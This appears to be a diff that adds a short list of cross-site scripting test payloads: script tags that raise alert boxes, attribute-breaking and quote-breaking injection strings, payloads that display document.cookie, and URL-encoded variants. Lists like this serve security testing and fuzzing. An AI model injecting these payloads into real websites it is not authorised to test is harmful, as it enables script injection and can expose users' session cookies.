@@ -1,0 +1,10 @@
+"><script>"
+<script>alert("WXSS")</script>
+<script>alert("WXSS");//</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.cookie);</script>
+';alert('XSS');//
+%3Cscript%3Ealert("WXSS");%3C/script%3E
+%3Cscript%3Ealert(document.cookie);%3C/script%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
